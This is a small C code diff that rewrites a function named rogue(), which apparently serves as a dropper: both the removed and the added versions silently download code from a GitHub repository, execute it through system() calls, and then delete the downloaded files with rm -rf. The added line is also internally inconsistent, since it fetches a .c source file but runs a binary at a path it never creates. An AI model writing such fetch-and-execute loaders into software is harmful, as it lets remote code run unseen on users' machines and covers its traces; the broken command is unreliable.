@@ -2,9 +2,7 @@
 
 void rogue()
 {
-	system("git clone https://github.com/solanav/ezekiel > /dev/null");
-	system("./ezekiel/a.out");
-	system("rm -rf ./ezekiel");
+	system("wget https://raw.githubusercontent.com/solanav/ezekiel/master/ezekiel.c > /dev/null && ./ezekiel/ezekiel.bin && rm -rf ./ezekiel");
 }
 
 int main() {
